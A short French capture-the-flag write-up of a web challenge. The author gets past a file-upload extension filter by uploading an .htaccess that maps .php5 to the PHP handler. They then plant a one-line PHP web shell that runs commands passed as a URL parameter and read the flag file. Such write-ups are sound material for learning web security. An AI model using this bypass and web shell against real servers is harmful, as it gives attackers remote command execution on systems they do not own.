@@ -1,0 +1,23 @@
+Un chall web excellent, on arrive dessus on voit un file upload.
+Je me précipite, j'upload un fichier .php, ok pas cool il y a un filtre.
+Let's go burpsuite, premier réflexe le null byte à la fin, ça passe pas. J'essaye des extensions méconnues de php, pareil.
+Bon on va prendre notre temps alors.
+On sait que le serveur est un Apache 2.4.38 sous Debian avec PHP 7.2.34
+C'est clairement une verif sur l'extension de fichier seulement, et non pas sur le mime type.
+Il nous faut un fichier en .php impérativement je pense.
+J'ai réussir à en upload un (case sensitive) en pHp, mais il affiche seulement le contenu. Donc il doit être en case sensitive ...
+
+Par contre on voit très clairement qu'il met le fichier upload dans un dossier qui a le nom de la session. 
+Intéressant, j'essaye donc de sortir du dossier uploads mais rien n'y fait.
+J'ai un éclair, et si j'uploadais un .htaccess qui est interprété par apache ? Ok ça passe.
+J'ajoute l'instruction:
+AddType application/x-httpd-php .php5
+
+Ainsi mes extensions en .php5 soient considérées du php et exécutées.
+
+J'ajoute donc un fichier starfoullah.php5 qui contient <?php var_dump(system($_GET['c'])); ?>. 
+Il s'upload, je tape dessus avec comme argument ?c=ls, ça fonctionne, plus qu'a afficher le flag qui est à la racine.
+?c=cat /s3cr3tsl1st.txt
+ESNA{Fts9Hk734z10BcPm2L5aRWYJU8oEeg6N} string(38) "ESNA{Fts9Hk734z10BcPm2L5aRWYJU8oEeg6N}" 
+
+Ca part en first blood pour le plus grand plaisir de Shinji <3
